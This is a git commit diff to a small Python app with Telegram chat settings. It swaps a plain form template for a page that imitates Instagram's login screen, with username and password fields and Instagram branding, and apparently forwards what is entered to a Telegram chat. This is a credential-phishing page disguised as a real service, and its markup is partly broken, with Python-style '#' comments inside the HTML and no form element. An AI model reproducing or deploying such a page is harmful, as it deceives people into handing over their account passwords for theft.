87142e4c349d548157da66739c0f1b54f7f2d423
Sahil Thakur <94735251+geeksahilthakur@users.noreply.github.com>
2024-01-20 12:50:15 +0530

    Update app.py

--- app.py
+++ app.py
@@ -10,22 +10,111 @@ TELEGRAM_CHAT_ID = '5043961881'  # Replace with your actual Telegram chat ID
 # Define the form template
 form_template = """
 <!DOCTYPE html>
-<html>
+# <html>
+# <head>
+#     <title>Telegram Form</title>
+# </head>
+# <body>
+#     <form id="telegramForm" action="/submit" method="post">
+#         <label for="name">Name:</label>
+#         <input type="text" id="name" name="name" required><br><br>
+
+#         <label for="email">Email:</label>
+#         <input type="email" id="email" name="email" required><br><br>
+
+#         <input type="submit" value="Submit">
+#     </form>
+# </body>
+# </html>
+
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Telegram Form</title>
+	<meta charset="UTF-8">
+	<title>Instagram Login Page</title>
+	<link rel="stylesheet" href="styles.css">
 </head>
+
+
+
+
+
+
+
 <body>
-    <form id="telegramForm" action="/submit" method="post">
-        <label for="name">Name:</label>
-        <input type="text" id="name" name="name" required><br><br>
 
-        <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required><br><br>
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<!-- Instagram logo -->
+			<div class="logo">
+				<img src="instagram.png" alt="instagram" style="width: 175px;">
+			</div>
 
-        <input type="submit" value="Submit">
-    </form>
+			<!-- Login form -->
+			<div class="form">
+				<div class="input_field">
+					<input type="text"  id="name" name="name" placeholder="Phone number, username, or email" class="input">
+				</div>
+				<div class="input_field">
+					<input type="password" id="email" name="email" placeholder="Password" class="input">
+				</div>
+<!--				<div class="btn"><a href="#">Log In</a></div>-->
+                <input class="btn" type="submit" value="Submit">
+
+			</div>
+
+			<!-- "OR" section with Facebook login and Forgot password link -->
+			<div class="or">
+				<div class="line"></div>
+				<p>OR</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<img src="facebook.png" alt="facebook">
+					<p>Log in with Facebook</p>
+				</div>
+				<div class="forgot">
+					<a href="#">Forgot password?</a>
+				</div>
+			</div>
+		</div>
+
+		<!-- Sign up link -->
+		<div class="signup">
+			<p>Don't have an account? <a href="#">Sign up</a></p>
+		</div>
+
+		<!-- App download section -->
+		<div class="apps">
+			<p>Get the app.</p>
+			<div class="icons">
+				<a href="#"><img src="appstore.png" alt="appstore"></a>
+				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
+			</div>
+		</div>
+	</div>
+
+	<!-- Footer with links and copyright information -->
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">SUPPORT</a></li>
+				<li><a href="#">PRESS</a></li>
+				<!-- Other links... -->
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2019 INSTAGRAM
+		</div>
+	</div>
+</div>
+
 </body>
 </html>
+
 """
 
 # Route for displaying the form
